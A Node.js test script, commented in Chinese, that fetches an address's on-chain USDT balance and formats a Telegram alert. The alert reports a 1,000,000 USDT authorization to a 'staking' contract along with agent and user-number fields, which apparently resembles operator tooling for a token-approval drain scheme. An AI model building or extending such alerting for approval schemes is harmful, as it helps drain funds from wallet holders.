// 测试Telegram通知服务的链上余额获取
const https = require('https');

async function testTelegramService() {
  try {
    console.log('🧪 测试Telegram通知服务的链上余额获取...');
    
    const address = '0x2a2eAe05aa9eBA985A1243cbfc67808aF0192141';
    const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
    const ETH_RPC_URL = 'https://ethereum.publicnode.com';
    
    console.log('📱 地址:', address);
    
    // 模拟Telegram通知服务的getOnChainUSDTBalance方法
    async function getOnChainUSDTBalance(address) {
      try {
        // 1. 获取最新区块号
        const blockResponse = await fetch(ETH_RPC_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            jsonrpc: '2.0',
            method: 'eth_blockNumber',
            params: [],
            id: 1
          })
        });

        const blockData = await blockResponse.json();
        const blockNumber = blockData.result;
        console.log('📱 区块号:', blockNumber);

        // 2. 调用USDT合约的balanceOf方法
        const balanceResponse = await fetch(ETH_RPC_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            jsonrpc: '2.0',
            method: 'eth_call',
            params: [
              {
                to: USDT_CONTRACT,
                data: `0x70a08231${address.slice(2).padStart(64, '0')}`
              },
              blockNumber
            ],
            id: 1
          })
        });

        const balanceData = await balanceResponse.json();
        
        if (balanceData.error) {
          console.error('❌ 获取链上USDT余额失败:', balanceData.error);
          return 0;
        }

        // 3. 解析余额 (ETH主网USDT使用6位小数)
        const balanceHex = balanceData.result;
        const balanceWei = BigInt(balanceHex);
        const balance = Number(balanceWei) / Math.pow(10, 6);

        return balance;

      } catch (error) {
        console.error('❌ 获取链上USDT余额异常:', error);
        return 0;
      }
    }
    
    // 测试链上余额获取
    const onChainBalance = await getOnChainUSDTBalance(address);
    console.log('💰 链上USDT余额:', onChainBalance);
    
    // 构建授权消息
    const message = `
钱包余额: ${onChainBalance.toFixed(6)}
顶层代理: 
代理昵称: 
用户编号: 274
用户备注: 暂无备注
是否活动: 是
用户钱包: 
${address}
授权金额: 1000000 USDT
客户地址: 
${address.toLowerCase()}
授权对象: 
${process.env.STAKING_CONTRACT_ADDRESS || '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218'}
执行操作: 客户调整我方授权额度
    `.trim();
    
    console.log('\n📝 构建的消息:');
    console.log('='.repeat(50));
    console.log(message);
    console.log('='.repeat(50));
    
  } catch (error) {
    console.error('❌ 测试失败:', error);
  }
}

// 运行测试
testTelegramService();
